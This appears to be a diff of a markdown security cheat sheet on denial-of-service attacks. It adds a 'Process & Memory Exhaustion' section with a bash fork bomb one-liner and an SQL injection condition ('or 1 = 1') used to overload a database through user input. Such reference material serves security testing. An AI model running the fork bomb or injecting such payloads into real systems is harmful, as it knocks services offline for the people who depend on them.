@@ -1,27 +1,9 @@
 # DoS (Denial of Service)
 
 ## Table of Contents
-- [Resource Exhaustion via Large Query](#resource-exhaustion-via-large-query)
 - [Account Lockout](#account-lockout)
 - [Chaining with Cache Poisoning](#chaining-with-cache-poisoning)
-
-## Resource Exhaustion via Large Query
-
-### A query that retrieves a large amount of data can cause a denial of service by putting a heavy load on the database.
-
-- Abusing search/filter functionality
-    1. Query that filters large table by id
-        ```sql
-        SELECT * FROM large_table WHERE id = {user_input};
-        ```
-    2. Standard query
-        ```sql
-        SELECT * FROM large_table WHERE id = 1;
-        ```
-    3. Manipulated query
-        ```sql
-        SELECT * FROM large_table WHERE id = 1 or 1 = 1;
-        ```
+- [Process & Memory Exhaustion](#process--memory-exhaustion)
 
 ## Account Lockout
 
@@ -50,3 +32,26 @@
 
 - Denial of service via cache poisoning
     - Hackerone report, [Denial of service via cache poisoning](https://hackerone.com/reports/409370)
+
+## Process & Memory Exhaustion
+
+### Triggering actions that consume all available process slots or memory.
+
+- Fork bomb
+    ```bash
+    :(){:|:&};:
+    ```
+
+- Resource Exhaustion by putting a heavy load on the database
+    1. Query that filters large table by id
+        ```sql
+        SELECT * FROM large_table WHERE id = {user_input};
+        ```
+    2. Standard query
+        ```sql
+        SELECT * FROM large_table WHERE id = 1;
+        ```
+    3. Manipulated query
+        ```sql
+        SELECT * FROM large_table WHERE id = 1 or 1 = 1;
+        ```
